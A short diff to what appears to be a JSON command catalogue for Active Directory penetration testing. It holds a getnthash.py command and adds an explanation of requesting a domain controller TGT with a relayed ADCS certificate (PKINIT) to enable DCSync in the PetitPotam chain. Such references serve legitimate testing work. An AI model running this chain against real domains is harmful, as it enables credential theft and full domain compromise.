@@ -95,5 +95,6 @@
       "label": "Extract the NT hash from the TGT",
       "command": "export KRB5CCNAME=user.ccache; python /opt/PKINITtools/getnthash.py -key <as_rep_key> <domain>/<user>"
     }
-  ]
+  ],
+  "explain": "Requests a TGT for the DC machine account using a captured ADCS certificate (PKINIT):\n  gettgtpkinit.py          PKINITtools TGT requester\n  -pfx-base64 <base64_cert>   the relayed certificate, base64-encoded\n  <domain>/<dc_host>$      the DC machine account the cert is for\n  <output>.ccache          output ticket cache\nThe DC machine account has replication rights, so this TGT enables DCSync (or getnthash to recover its NT hash). Part of the PetitPotam chain."
 }
